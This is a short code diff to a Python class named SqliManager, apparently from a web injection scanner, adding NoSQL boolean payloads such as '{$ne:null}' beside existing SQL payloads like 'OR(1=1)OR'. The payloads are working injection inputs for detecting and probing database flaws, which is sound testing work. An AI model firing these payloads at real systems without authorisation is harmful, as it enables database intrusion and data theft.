@@ -35,6 +35,9 @@ class SqliManager:
         self._bool_based_payloads = [
             {'TruePld': '\'OR(1=1)OR\'', 'FalsePld': '\'OR(1=2)OR\'', 'True2Pld': '\'OR(2=2)OR\'',
              'False2Pld': '\'OR(1=3)OR\'', 'True3Pld': '\'OR(3=3)OR\''},
+            {'TruePld': '{$ne:null}', 'FalsePld': '{$eq:null}',
+             'True2Pld': '{$ne:55555555}', 'False2Pld': '{$eq:55555555}',
+             'True3Pld': '{$ne:66666666}', 'False3Pld': '{$eq:66666666}'},
             {'TruePld': '"OR(1=1)OR"', 'FalsePld': '"OR(1=2)OR"', 'True2Pld': '"OR(2=2)OR"',
              'False2Pld': '"OR(1=3)OR"', 'True3Pld': '"OR(3=3)OR"'},
             {'TruePld': '\'|| \'1\'==\'1', 'FalsePld': '\'|| \'1\'==\'2', 'True2Pld': '\'|| \'2\'==\'2',
